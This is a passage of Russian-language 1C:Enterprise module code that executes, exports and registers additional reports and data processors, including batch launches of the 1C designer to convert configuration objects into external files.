	ИначеЕсли ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.ЗаполнениеОбъекта
		ИЛИ ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет
		ИЛИ ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма Тогда
		
		ОбъектыНазначения = Неопределено;
		ПараметрыКоманды.Свойство(""ОбъектыНазначения"", ОбъектыНазначения);
		
		Если ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма Тогда
			
			// Здесь только произвольная печать. Печать в MXL выполняется средствами подсистемы Печать.
			ВыполнитьКомандуФормированияПечатнойФормы(
				ВнешнийОбъект,
				ИдентификаторКоманды,
				?(ПередаватьПараметры, ПараметрыКоманды, Неопределено),
				ОбъектыНазначения,
				ЭтоСценарийВБезопасномРежиме);
			
		Иначе
			
			ВыполнитьНазначаемуюКомандуДополнительногоОтчетаИлиОбработки(
				ВнешнийОбъект,
				ИдентификаторКоманды,
				?(ПередаватьПараметры, ПараметрыКоманды, Неопределено),
				ОбъектыНазначения,
				ЭтоСценарийВБезопасномРежиме);
			
			Если ВидОбработки = Перечисления.ВидыДополнительныхОтчетовИОбработок.ЗаполнениеОбъекта Тогда
				ИзмененныеОбъекты = ОбъектыНазначения;
			КонецЕсли;
		КонецЕсли;
		
	КонецЕсли;
	
	ПараметрыКоманды.РезультатВыполнения.Вставить(""ОповеститьФормы"", СтандартныеПодсистемыСервер.ПодготовитьОповещениеФормОбИзменении(ИзмененныеОбъекты));
	
	Если ТипЗнч(АдресРезультата) = Тип(""Строка"") И ЭтоАдресВременногоХранилища(АдресРезультата) Тогда
		ПоместитьВоВременноеХранилище(ПараметрыКоманды.РезультатВыполнения, АдресРезультата);
	КонецЕсли;
	
	Возврат ПараметрыКоманды.РезультатВыполнения;
	
КонецФункции

// Для внутреннего использования.
Процедура ВыполнитьСценарийВБезопасномРежиме(ВнешнийОбъект, ПараметрыКоманды, ОбъектыНазначения = Неопределено)
	
	РасширениеБезопасногоРежима = ДополнительныеОтчетыИОбработкиВБезопасномРежимеСлужебный;
	
	ВнешнийОбъект = ОбъектВнешнейОбработки(ПараметрыКоманды.ДополнительнаяОбработкаСсылка);
	ИдентификаторКоманды = ПараметрыКоманды.ИдентификаторКоманды;
	
	Сценарий = ВнешнийОбъект.СформироватьСценарий(ИдентификаторКоманды, ПараметрыКоманды);
	КлючСессии = ДополнительныеОтчетыИОбработкиВБезопасномРежимеСлужебный.СформироватьКлючСессииРасширенияБезопасногоРежима(
		ПараметрыКоманды.ДополнительнаяОбработкаСсылка);
	
	РасширениеБезопасногоРежима.ВыполнитьСценарийБезопасногоРежима(
		КлючСессии, Сценарий, ВнешнийОбъект, ПараметрыКоманды, Неопределено, ОбъектыНазначения);
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Процедуры используемые при обмене данными.

// Переопределяет стандартное поведение при загрузке данных.
// Реквизит РегламентноеЗаданиеGUID табличной части Команды не переносится,
// т.к. связан с регламентным заданием текущей базы.
//
Процедура ПриПолученииДополнительнойОбработки(ЭлементДанных, ПолучениеЭлемента)
	
	Если ПолучениеЭлемента = ПолучениеЭлементаДанных.Игнорировать Тогда
		
		// Стандартную обработку не переопределяем.
		
	ИначеЕсли ТипЗнч(ЭлементДанных) = Тип(""СправочникОбъект.ДополнительныеОтчетыИОбработки"")
		И ЭлементДанных.Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка Тогда
		
		// Таблица уникальных идентификаторов регламентных заданий.
		ТекстЗапроса =
		""ВЫБРАТЬ
		|	Команды.Ссылка КАК Ссылка,
		|	Команды.Идентификатор КАК Идентификатор,
		|	Команды.РегламентноеЗаданиеGUID КАК РегламентноеЗаданиеGUID
		|ИЗ
		|	Справочник.ДополнительныеОтчетыИОбработки.Команды КАК Команды
		|ГДЕ
		|	Команды.Ссылка = &Ссылка"";
		
		Запрос = Новый Запрос(ТекстЗапроса);
		Запрос.Параметры.Вставить(""Ссылка"", ЭлементДанных.Ссылка);
		
		ИдентификаторыРегламентныхЗаданий = Запрос.Выполнить().Выгрузить();
		
		// Заполнение идентификаторов регламентных заданий в таблице команд из данных текущей БД.
		Для Каждого СтрокаКоманда Из ЭлементДанных.Команды Цикл
			Найденные = ИдентификаторыРегламентныхЗаданий.НайтиСтроки(Новый Структура(""Идентификатор"", СтрокаКоманда.Идентификатор));
			Если Найденные.Количество() = 0 Тогда
				СтрокаКоманда.РегламентноеЗаданиеGUID = Новый УникальныйИдентификатор(""00000000-0000-0000-0000-000000000000"");
			Иначе
				СтрокаКоманда.РегламентноеЗаданиеGUID = Найденные[0].РегламентноеЗаданиеGUID;
			КонецЕсли;
		КонецЦикла;
		
	КонецЕсли;
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Сопоставление элементов справочника объектам метаданных конфигурации.

Процедура СопоставитьОбработкиКонфигурацииСОбработкамиСправочника(ОтчетыИОбработки)
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ
	|	ДополнительныеОтчетыИОбработки.Ссылка,
	|	ДополнительныеОтчетыИОбработки.Версия,
	|	ДополнительныеОтчетыИОбработки.ИмяОбъекта,
	|	ДополнительныеОтчетыИОбработки.ИмяФайла
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДополнительныеОтчетыИОбработки"";
	
	ОбработкиИзКонфигурации = Запрос.Выполнить().Выгрузить();
	Для Каждого ОбработкаКонфигурации Из ОбработкиИзКонфигурации Цикл
		ОбработкаКонфигурации.ИмяОбъекта = ВРег(ОбработкаКонфигурации.ИмяОбъекта);
		ОбработкаКонфигурации.ИмяФайла   = ВРег(ОбработкаКонфигурации.ИмяФайла);
	КонецЦикла;
	ОбработкиИзКонфигурации.Колонки.Добавить(""Найдена"", Новый ОписаниеТипов(""Булево""));
	
	ОтчетыИОбработки.Колонки.Добавить(""Имя"");
	ОтчетыИОбработки.Колонки.Добавить(""ИмяФайла"");
	ОтчетыИОбработки.Колонки.Добавить(""ПолноеИмя"");
	ОтчетыИОбработки.Колонки.Добавить(""Вид"");
	ОтчетыИОбработки.Колонки.Добавить(""Расширение"");
	ОтчетыИОбработки.Колонки.Добавить(""Менеджер"");
	ОтчетыИОбработки.Колонки.Добавить(""Сведения"");
	ОтчетыИОбработки.Колонки.Добавить(""ДанныеИзСправочника"");
	ОтчетыИОбработки.Колонки.Добавить(""Ссылка"");
	
	ОбратныйИндекс = ОтчетыИОбработки.Количество();
	Пока ОбратныйИндекс > 0 Цикл
		ОбратныйИндекс = ОбратныйИндекс - 1;
		СтрокаТаблицы = ОтчетыИОбработки[ОбратныйИндекс];
		
		СтрокаТаблицы.Имя = СтрокаТаблицы.ОбъектМетаданных.Имя;
		СтрокаТаблицы.ПолноеИмя = СтрокаТаблицы.ОбъектМетаданных.ПолноеИмя();
		СтрокаТаблицы.Вид = ВРег(СтрРазделить(СтрокаТаблицы.ПолноеИмя, ""."")[0]);
		Если СтрокаТаблицы.Вид = ""ОТЧЕТ"" Тогда
			СтрокаТаблицы.Расширение = ""erf"";
			МенеджерИзМетаданныхКонфигурации = Отчеты[СтрокаТаблицы.Имя];
		ИначеЕсли СтрокаТаблицы.Вид = ""ОБРАБОТКА"" Тогда
			СтрокаТаблицы.Расширение = ""epf"";
			МенеджерИзМетаданныхКонфигурации = Обработки[СтрокаТаблицы.Имя];
		Иначе
			ОтчетыИОбработки.Удалить(ОбратныйИндекс);
			Продолжить; // Неподдерживаемый вид объекта метаданных.
		КонецЕсли;
		СтрокаТаблицы.ИмяФайла = СтрокаТаблицы.Имя + ""."" + СтрокаТаблицы.Расширение;
		СтрокаТаблицы.СтарыеИменаФайлов.Вставить(0, СтрокаТаблицы.ИмяФайла);
		СтрокаТаблицы.СтарыеИменаОбъектов.Вставить(0, СтрокаТаблицы.Имя);
		
		СтрокаТаблицы.Сведения = МенеджерИзМетаданныхКонфигурации.Создать().СведенияОВнешнейОбработке();
		
		// Поиск в справочнике.
		ДанныеИзСправочника = Неопределено;
		Для Каждого ИмяФайла Из СтрокаТаблицы.СтарыеИменаФайлов Цикл
			ДанныеИзСправочника = ОбработкиИзКонфигурации.Найти(ВРег(ИмяФайла), ""ИмяФайла"");
			Если ДанныеИзСправочника <> Неопределено Тогда
				Прервать;
			КонецЕсли;
		КонецЦикла;
		Если ДанныеИзСправочника = Неопределено Тогда
			Для Каждого ИмяОбъекта Из СтрокаТаблицы.СтарыеИменаОбъектов Цикл
				ДанныеИзСправочника = ОбработкиИзКонфигурации.Найти(ВРег(ИмяОбъекта), ""ИмяОбъекта"");
				Если ДанныеИзСправочника <> Неопределено Тогда
					Прервать;
				КонецЕсли;
			КонецЦикла;
		КонецЕсли;
		
		Если ДанныеИзСправочника = Неопределено Тогда
			Продолжить; // Будет зарегистрирована новая обработка.
		КонецЕсли;
		
		Если ВерсияЧислом(ДанныеИзСправочника.Версия) >= ВерсияЧислом(СтрокаТаблицы.Сведения.Версия)
			И СтрокаТаблицы.Сведения.Версия <> Метаданные.Версия Тогда
			// Обновление не требуется, т.к. в справочнике уже актуальная версия обработки.
			ОтчетыИОбработки.Удалить(ОбратныйИндекс);
		Иначе
			// Регистрация ссылки для последующего обновления.
			СтрокаТаблицы.Ссылка = ДанныеИзСправочника.Ссылка;
		КонецЕсли;
		ОбработкиИзКонфигурации.Удалить(ДанныеИзСправочника);
		
	КонецЦикла;
	
	ОтчетыИОбработки.Колонки.Удалить(""СтарыеИменаФайлов"");
	ОтчетыИОбработки.Колонки.Удалить(""СтарыеИменаОбъектов"");
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Выгрузка отчетов и обработок конфигурации в файлы внешних отчетов и обработок.

Процедура ВыгрузитьОтчетыИОбработкиВФайлы(ОтчетыИОбработки)
	
	ОтчетыИОбработки.Колонки.Добавить(""ДвоичныеДанные"");
	Кавычка = """""""";
	Параметры = Новый Структура;
	Параметры.Вставить(""РабочийКаталог"", ОбщегоНазначения.СоздатьВременныйКаталог(""ARADP""));
	КлючЗапуска = "" /DumpConfigToFiles "" + Кавычка + Параметры.РабочийКаталог + Кавычка;
	Выгрузка = ПакетныйЗапускКонфигуратора(Параметры, КлючЗапуска);
	Если Не Выгрузка.Успех Тогда
		ТекстОшибки = СокрЛП(
			НСтр(""ru = 'Не удалось выгрузить отчеты и обработки конфигурации во внешние файлы:'"")
			+ Символы.ПС + Выгрузка.Кратко
			+ Символы.ПС + Выгрузка.Подробно);
		ЗаписатьПредупреждение(Неопределено, ТекстОшибки);
		ОтчетыИОбработки.Очистить();
	КонецЕсли;
	
	ОбратныйИндекс = ОтчетыИОбработки.Количество();
	Пока ОбратныйИндекс > 0 Цикл
		ОбратныйИндекс = ОбратныйИндекс - 1;
		СтрокаТаблицы = ОтчетыИОбработки[ОбратныйИндекс];
		
		Если СтрокаТаблицы.Вид = ""ОТЧЕТ"" Тогда
			КаталогВида = Параметры.РабочийКаталог + ""Reports"" + ПолучитьРазделительПути();
		ИначеЕсли СтрокаТаблицы.Вид = ""ОБРАБОТКА"" Тогда
			КаталогВида = Параметры.РабочийКаталог + ""DataProcessors"" + ПолучитьРазделительПути();
		Иначе
			ЗаписатьОшибку(СтрокаТаблицы.Ссылка, НСтр(""ru = 'Неподдерживаемый вид объектов метаданных: """"1""""'""), СтрокаТаблицы.Вид);
			ОтчетыИОбработки.Удалить(ОбратныйИндекс);
			Продолжить;
		КонецЕсли;
		
		ПолноеИмяСхемыОбъекта = КаталогВида + СтрокаТаблицы.Имя + "".xml"";
		ТекстСхемы = ПрочитатьТекстовыйФайл(ПолноеИмяСхемыОбъекта);
		Если ТекстСхемы = Неопределено Тогда
			ЗаписатьОшибку(СтрокаТаблицы.Ссылка, НСтр(""ru = 'Не обнаружен файл """"%1"""".'""), ПолноеИмяСхемыОбъекта);
			ОтчетыИОбработки.Удалить(ОбратныйИндекс);
			Продолжить;
		КонецЕсли;
		Если СтрокаТаблицы.Вид = ""ОТЧЕТ"" Тогда
			ТекстСхемы = СтрЗаменить(ТекстСхемы, ""Report"", ""ExternalReport"");
			ТекстСхемы = СтрЗаменить(ТекстСхемы, ""ExternalReportTabularSection"", ""ReportTabularSection"");
		ИначеЕсли СтрокаТаблицы.Вид = ""ОБРАБОТКА"" Тогда
			ТекстСхемы = СтрЗаменить(ТекстСхемы, ""DataProcessor"", ""ExternalDataProcessor"");
		КонецЕсли;
		ЗаписатьТекстовыйФайл(ПолноеИмяСхемыОбъекта, ТекстСхемы);
		
		Если СтрокаТаблицы.Вид = ""ОБРАБОТКА"" Тогда
			ДокументDOM = ПрочитатьДокументDOM(ПолноеИмяСхемыОбъекта);
			Разыменователь = Новый РазыменовательПространствИменDOM(ДокументDOM);
			XMLИзменен = Ложь;
			
			ВыраженияПоискаУдаляемыхУзлов = Новый Массив;
			ВыраженияПоискаУдаляемыхУзлов.Добавить(""//xmlns:Command"");
			ВыраженияПоискаУдаляемыхУзлов.Добавить(""//*[contains(@name, 'ExternalDataProcessorManager.')]"");
			ВыраженияПоискаУдаляемыхУзлов.Добавить(""//xmlns:UseStandardCommands"");
			ВыраженияПоискаУдаляемыхУзлов.Добавить(""//xmlns:IncludeHelpInContents"");
			ВыраженияПоискаУдаляемыхУзлов.Добавить(""//xmlns:ExtendedPresentation"");
			ВыраженияПоискаУдаляемыхУзлов.Добавить(""//xmlns:Explanation"");
			
			Для Каждого Выражение Из ВыраженияПоискаУдаляемыхУзлов Цикл
				РезультатXPath = ВычислитьВыражениеXPath(Выражение, ДокументDOM, Разыменователь);
				ЭлементDOM = РезультатXPath.ПолучитьСледующий();
				Пока ЭлементDOM <> Неопределено Цикл
					ЭлементDOM.РодительскийУзел.УдалитьДочерний(ЭлементDOM);
					XMLИзменен = Истина;
					ЭлементDOM = РезультатXPath.ПолучитьСледующий();
				КонецЦикла;
			КонецЦикла;
			
			Если XMLИзменен Тогда
				ЗаписатьДокументDOM(ДокументDOM, ПолноеИмяСхемыОбъекта);
			КонецЕсли;
		КонецЕсли;
		
		ПолноеИмяФайла = Параметры.РабочийКаталог + СтрокаТаблицы.ИмяФайла;
		КлючЗапуска = "" /LoadExternalDataProcessorOrReportFromFiles "" + Кавычка + ПолноеИмяСхемыОбъекта + Кавычка + "" "" + Кавычка + ПолноеИмяФайла + Кавычка;
		СозданиеОбработки = ПакетныйЗапускКонфигуратора(Параметры, КлючЗапуска);
		Если Не СозданиеОбработки.Успех Тогда
			ТекстОшибки = НСтр(""ru = 'Не удалось создать """"%1"""" из внешнего файла """"%2"""":%3'"");
			ЗаписатьПредупреждение(Неопределено, ТекстОшибки, СтрокаТаблицы.ПолноеИмя, ПолноеИмяСхемыОбъекта, Символы.ПС + СокрЛП(СозданиеОбработки.Кратко + Символы.ПС + СозданиеОбработки.Подробно));
			ОтчетыИОбработки.Удалить(ОбратныйИндекс);
			Продолжить;
		КонецЕсли;
		СтрокаТаблицы.ДвоичныеДанные = Новый ДвоичныеДанные(ПолноеИмяФайла);
	КонецЦикла;
	
	Если Параметры.КаталогКопии1CD <> Неопределено Тогда
		ОбщегоНазначения.УдалитьВременныйКаталог(Параметры.КаталогКопии1CD);
	КонецЕсли;
	ОбщегоНазначения.УдалитьВременныйКаталог(Параметры.РабочийКаталог);
	
КонецПроцедуры

Функция ПакетныйЗапускКонфигуратора(Параметры, КлючЗапуска)
	Результат = Новый Структура(""Успех, Кратко, Подробно"", Ложь, """", """");
	Кавычка = """""""";
	ОбразецПараметров = Новый Структура(""РабочийКаталог, Пользователь, Пароль, КаталогBIN, ПутьККонфигурации, КаталогКопии1CD"");
	ОбщегоНазначенияКлиентСервер.ДополнитьСтруктуру(Параметры, ОбразецПараметров, Ложь);
	Если Не ЗначениеЗаполнено(Параметры.Пользователь) Тогда
		Параметры.Пользователь = ИмяПользователя();
	КонецЕсли;
	Если Не ФайлСуществует(Параметры.РабочийКаталог) Тогда
		СоздатьКаталог(Параметры.РабочийКаталог);
	КонецЕсли;
	Если Не ЗначениеЗаполнено(Параметры.КаталогBIN) Тогда
		Параметры.КаталогBIN = КаталогПрограммы();
	КонецЕсли;
	Если Не ЗначениеЗаполнено(Параметры.ПутьККонфигурации) Тогда
		Параметры.ПутьККонфигурации = СтрокаСоединенияИнформационнойБазы();
		Если ОткрытКонфигуратор() Тогда
			Если ОбщегоНазначения.ИнформационнаяБазаФайловая() Тогда
				КаталогИнформационнойБазы = СтроковыеФункцииКлиентСервер.ПараметрыИзСтроки(Параметры.ПутьККонфигурации).file;
				Параметры.КаталогКопии1CD = Параметры.РабочийКаталог + ""BaseCopy"" + ПолучитьРазделительПути();
				СоздатьКаталог(Параметры.КаталогКопии1CD);
				КопироватьФайл(КаталогИнформационнойБазы + ""\1Cv8.1CD"", Параметры.КаталогКопии1CD + ""1Cv8.1CD"");
				Параметры.ПутьККонфигурации = ""File="" + Кавычка + Параметры.КаталогКопии1CD + Кавычка + "";"";
			Иначе
				Результат.Кратко = НСтр(""ru = 'Для выгрузки модулей необходимо закрыть конфигуратор.'"");
				Возврат Результат;
			КонецЕсли;
		КонецЕсли;
		Параметры.ПутьККонфигурации = СтрЗаменить(Параметры.ПутьККонфигурации, Кавычка, Кавычка + Кавычка);
	КонецЕсли;
	
	ИмяФайлаСообщений = Параметры.РабочийКаталог + ""Выгрузка.log"";
	
	СтрокаКоманды = Кавычка + Параметры.КаталогBIN + ""1cv8.exe"" + Кавычка + "" DESIGNER""
		+ "" /IBConnectionString "" + Кавычка + Параметры.ПутьККонфигурации + Кавычка
		+ ?(Параметры.Пользователь = """",
			"""",
			"" /N "" + Кавычка + Параметры.Пользователь + Кавычка + "" /P "" + Кавычка + Параметры.Пароль + Кавычка)
		+ КлючЗапуска
		+ "" /Out ""                + Кавычка + ИмяФайлаСообщений + Кавычка
		+ "" /DisableStartupDialogs""   // Без стартового диалога и диалогов аутентификации.
		+ "" /DisableStartupMessages""; // Без стартовых предупреждений.
	
	ПараметрыЗапускаКоманды = ОбщегоНазначенияКлиентСервер.ПараметрыЗапускаПрограммы();
	ПараметрыЗапускаКоманды.ДождатьсяЗавершения = Истина;
	
	РезультатЗапуска = ОбщегоНазначенияКлиентСервер.ЗапуститьПрограмму(СтрокаКоманды, ПараметрыЗапускаКоманды);
	
	КодВозврата = РезультатЗапуска.КодВозврата;
	Если КодВозврата = 0 Тогда
		Результат.Успех = Истина;
		Возврат Результат;
	КонецЕсли;
	
	Результат.Кратко = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
		НСтр(""ru = 'Не удалось выгрузить конфигурацию в XML (код ошибки """"%1"""")'""),
		КодВозврата);
	Если ФайлСуществует(ИмяФайлаСообщений) Тогда
		ЧтениеТекста = Новый ЧтениеТекста(ИмяФайлаСообщений, , , , Ложь);
		Сообщения = СокрЛП(ЧтениеТекста.Прочитать());
		ЧтениеТекста.Закрыть();
		Если Сообщения <> """" Тогда
			Результат.Подробно = СтрЗаменить(Символы.ПС + Сообщения, Символы.ПС, Символы.ПС + Символы.Таб);
		КонецЕсли;
	КонецЕсли;
	Возврат Результат;
	
КонецФункции

Функция ФайлСуществует(ПолноеИмяФайла)
	Файл = Новый Файл(ПолноеИмяФайла);
	Возврат Файл.Существует();
КонецФункции

Функция ОткрытКонфигуратор()
	Сеансы = ПолучитьСеансыИнформационнойБазы();
	Для Каждого Сеанс Из Сеансы Цикл
		Если ВРег(Сеанс.ИмяПриложения) = ""DESIGNER"" Тогда
			Возврат Истина;
		КонецЕсли;
	КонецЦикла;
	Возврат Ложь;
КонецФункции

Функция ПрочитатьТекстовыйФайл(ПолноеИмяФайла)
	Если Не ФайлСуществует(ПолноеИмяФайла) Тогда
		Возврат Неопределено;
	КонецЕсли;
	ЧтениеТекста = Новый ЧтениеТекста(ПолноеИмяФайла);
	Текст = ЧтениеТекста.Прочитать();
	ЧтениеТекста.Закрыть();
	Возврат Текст;
КонецФункции

Процедура ЗаписатьТекстовыйФайл(ПолноеИмяФайла, Текст)
	ЗаписьТекста = Новый ЗаписьТекста(ПолноеИмяФайла, КодировкаТекста.UTF8);
	ЗаписьТекста.Записать(Текст);
	ЗаписьТекста.Закрыть();
КонецПроцедуры

Функция ПрочитатьДокументDOM(ПутьКФайлу)
	ЧтениеXML = Новый ЧтениеXML;
	ЧтениеXML.ОткрытьФайл(ПутьКФайлу);
	ПостроительDOM = Новый ПостроительDOM;
	ДокументDOM = ПостроительDOM.Прочитать(ЧтениеXML);
	ЧтениеXML.Закрыть();
	
	Возврат ДокументDOM;
КонецФункции

Функция ВычислитьВыражениеXPath(Выражение, ДокументDOM, Разыменователь)
	Возврат ДокументDOM.ВычислитьВыражениеXPath(Выражение, ДокументDOM, Разыменователь);
КонецФункции

Процедура ЗаписатьДокументDOM(ДокументDOM, ИмяФайла)
	ЗаписьXML = Новый ЗаписьXML;
	ЗаписьXML.ОткрытьФайл(ИмяФайла);
	ЗаписьDOM = Новый ЗаписьDOM;
	ЗаписьDOM.Записать(ДокументDOM, ЗаписьXML);
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Пакетная регистрация внешних отчетов и обработок в справочнике.

Процедура ЗарегистрироватьОтчетыИОбработки(ОтчетыИОбработки)
	
	Для Каждого СтрокаТаблицы Из ОтчетыИОбработки Цикл
		// Обновление/добавление.
		Если СтрокаТаблицы.Ссылка = Неопределено Тогда
			СправочникОбъект = Справочники.ДополнительныеОтчетыИОбработки.СоздатьЭлемент();
			СправочникОбъект.ИспользоватьДляФормыОбъекта = Истина;
			СправочникОбъект.ИспользоватьДляФормыСписка  = Истина;
			СправочникОбъект.Ответственный               = Пользователи.ТекущийПользователь();
		Иначе
			СправочникОбъект = СтрокаТаблицы.Ссылка.ПолучитьОбъект();
		КонецЕсли;
		
		ЭтоОтчет      = (СтрокаТаблицы.Вид = ""ОТЧЕТ"");
		АдресДанных   = ПоместитьВоВременноеХранилище(СтрокаТаблицы.ДвоичныеДанные);
		Менеджер      = ?(ЭтоОтчет, ВнешниеОтчеты, ВнешниеОбработки);
		Если ОбщегоНазначения.ЕстьЗащитаОтОпасныхДействий() Тогда
			ИмяОбъекта = Менеджер.Подключить(АдресДанных, , Истина,
				ОбщегоНазначения.ОписаниеЗащитыБезПредупреждений());
		Иначе
			ИмяОбъекта = Менеджер.Подключить(АдресДанных, , Истина);
		КонецЕсли;
		ВнешнийОбъект = Менеджер.Создать(ИмяОбъекта);
		
		ВнешнийОбъектМетаданные = ВнешнийОбъект.Метаданные();
		ОбработкаСведения = СтрокаТаблицы.Сведения;
		Если ОбработкаСведения.Наименование = Неопределено ИЛИ ОбработкаСведения.Информация = Неопределено Тогда
			Если ОбработкаСведения.Наименование = Неопределено Тогда
				ОбработкаСведения.Наименование = ВнешнийОбъектМетаданные.Представление();
			КонецЕсли;
			Если ОбработкаСведения.Информация = Неопределено Тогда
				ОбработкаСведения.Информация = ВнешнийОбъектМетаданные.Комментарий;
			КонецЕсли;
		КонецЕсли;
		
		ЗаполнитьЗначенияСвойств(СправочникОбъект, ОбработкаСведения, ""Наименование, БезопасныйРежим, Версия, Информация"");
		
		// Выгрузка настроек команд, которые переопределяются администратором.
		ПоискЗаданий = Новый Соответствие;
		Для Каждого СтараяКоманда Из СправочникОбъект.Команды Цикл
			Если ЗначениеЗаполнено(СтараяКоманда.РегламентноеЗаданиеGUID) Тогда
				ПоискЗаданий.Вставить(ВРег(СтараяКоманда.Идентификатор), СтараяКоманда.РегламентноеЗаданиеGUID);
			КонецЕсли;
		КонецЦикла;
		
		ПараметрыРегистрации = Новый Структура;
		ПараметрыРегистрации.Вставить(""АдресДанныхОбработки"", АдресДанных);
		ПараметрыРегистрации.Вставить(""ЭтоОтчет"", ЭтоОтчет);
		ПараметрыРегистрации.Вставить(""ОтключатьКонфликтующие"", Ложь);
		ПараметрыРегистрации.Вставить(""ИмяФайла"", СтрокаТаблицы.ИмяФайла);
		ПараметрыРегистрации.Вставить(""ОтключатьПубликацию"", Ложь);
		
		СправочникОбъект.ИмяОбъекта = Неопределено;
		СправочникОбъект.Публикация = Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется;
		СправочникОбъект.Вид        = ПолучитьВидОбработкиПоСтроковомуПредставлениюВида(
			ОбработкаСведения.Вид);
		
		Результат = ЗарегистрироватьОбработку(СправочникОбъект, ПараметрыРегистрации);
		Если Не Результат.Успех И Результат.ИмяОбъектаЗанято Тогда
			ПараметрыРегистрации.Вставить(""ОтключатьКонфликтующие"", Истина);
			ПараметрыРегистрации.Вставить(""Конфликтующие"", Результат.Конфликтующие);
			Результат = ЗарегистрироватьОбработку(СправочникОбъект, ПараметрыРегистрации);
		КонецЕсли;
		Если Не Результат.Успех Тогда
			Если Результат.ИмяОбъектаЗанято Тогда
				Результат.ТекстОшибки = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
					НСтр(""ru = 'Имя """"%1"""" занято объектами """"%2""""'""),
					ИмяОбъекта,
					Строка(Результат.Конфликтующие));
			КонецЕсли;
			ЗаписьЖурналаРегистрации(
				ДополнительныеОтчетыИОбработкиКлиентСервер.НаименованиеПодсистемы(Ложь),
				УровеньЖурналаРегистрации.Ошибка,
				Метаданные.ОбщиеМакеты.Найти(СтрокаТаблицы.ИмяМакета),
				,
				Результат.ТекстОшибки);
			Продолжить;
		КонецЕсли;
		
		СправочникОбъект.ХранилищеОбработки = Новый ХранилищеЗначения(СтрокаТаблицы.ДвоичныеДанные);
		СправочникОбъект.ИмяОбъекта         = ВнешнийОбъектМетаданные.Имя;
		СправочникОбъект.ИмяФайла           = СтрокаТаблицы.ИмяФайла;
		
		// Очистка и загрузка новых команд.
		Для Каждого Команда Из СправочникОбъект.Команды Цикл
			РегламентноеЗаданиеGUID = ПоискЗаданий.Получить(ВРег(Команда.Идентификатор));
			Если РегламентноеЗаданиеGUID <> Неопределено Тогда
				Команда.РегламентноеЗаданиеGUID = РегламентноеЗаданиеGUID;
				ПоискЗаданий.Удалить(ВРег(Команда.Идентификатор));
			КонецЕсли;
		КонецЦикла;
		
		// Удаление неактуальных заданий.
		Для Каждого КлючИЗначение Из ПоискЗаданий Цикл
			Попытка
				Задание = РегламентныеЗаданияСервер.Задание(КлючИЗначение.Значение);
				Задание.Удалить();
			Исключение
				ЗаписьЖурналаРегистрации(
					ОбновлениеИнформационнойБазы.СобытиеЖурналаРегистрации(),
					УровеньЖурналаРегистрации.Ошибка,
					Метаданные.Справочники.ДополнительныеОтчетыИОбработки,
					СправочникОбъект.Ссылка,
					СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
						НСтр(""ru = 'Ошибка при удалении задания """"%1"""":%2'""),
						КлючИЗначение.Значение,
						Символы.ПС + ПодробноеПредставлениеОшибки(ИнформацияОбОшибке())));
			КонецПопытки;
		КонецЦикла;
		
		Если ПроверитьГлобальнаяОбработка(СправочникОбъект.Вид) Тогда
			ТаблицаОбъектовМетаданных = ПодключенныеОбъектыМетаданных(СправочникОбъект.Вид);
			Для Каждого СтрокаТаблицы Из ТаблицаОбъектовМетаданных Цикл
				РазделСсылка = СтрокаТаблицы.Ссылка;
				СтрокаРаздела = СправочникОбъект.Разделы.Найти(РазделСсылка, ""Раздел"");
				Если СтрокаРаздела = Неопределено Тогда
					СтрокаРаздела = СправочникОбъект.Разделы.Добавить();
					СтрокаРаздела.Раздел = РазделСсылка;
				КонецЕсли;
			КонецЦикла;
		Иначе
			Для Каждого ОписаниеНазначения Из ОбработкаСведения.Назначение Цикл
				ОбъектМетаданных = Метаданные.НайтиПоПолномуИмени(ОписаниеНазначения);
				Если ОбъектМетаданных = Неопределено Тогда
					Продолжить;
				КонецЕсли;
				ОбъектНазначенияСсылка = ОбщегоНазначения.ИдентификаторОбъектаМетаданных(ОбъектМетаданных);
				СтрокаНазначения = СправочникОбъект.Назначение.Найти(ОбъектНазначенияСсылка, ""ОбъектНазначения"");
				Если СтрокаНазначения = Неопределено Тогда
					СтрокаНазначения = СправочникОбъект.Назначение.Добавить();
					СтрокаНазначения.ОбъектНазначения = ОбъектНазначенияСсылка;
				КонецЕсли;
			КонецЦикла;
		КонецЕсли;
		
		ОбновлениеИнформационнойБазы.ЗаписатьОбъект(СправочникОбъект, , Истина);
	КонецЦикла;
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Другие

// Устанавливает обработке вид публикации, использующийся для конфликтующих дополнительных отчетов и обработок.
Процедура ОтключитьКонфликтующую(ОбработкаОбъект)
	ВидРежимОтладки = Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.РежимОтладки;
	ДоступныеВиды = ДополнительныеОтчетыИОбработкиПовтИсп.ДоступныеВидыПубликации();
	Если ДоступныеВиды.Найти(ВидРежимОтладки) Тогда
		ОбработкаОбъект.Публикация = ВидРежимОтладки;
	Иначе
		ОбработкаОбъект.Публикация = Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.Отключена;
	КонецЕсли;
КонецПроцедуры

// Для внутреннего использования.
Функция ЗарегистрироватьОбработку(Знач Объект, Знач ПараметрыРегистрации) Экспорт
	
	ВидДополнительнаяОбработка = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительнаяОбработка;
	ВидДополнительныйОтчет     = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет;
	ВидОтчет                   = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет;
	
	// Получает файл обработки из временного хранилища, пытается создать объект
	// обработки (внешнего отчета) и получает информацию из объекта внешней обработки (отчета).
	
	Если ПараметрыРегистрации.ОтключатьКонфликтующие Тогда
		Для Каждого ЭлементСписка Из ПараметрыРегистрации.Конфликтующие Цикл
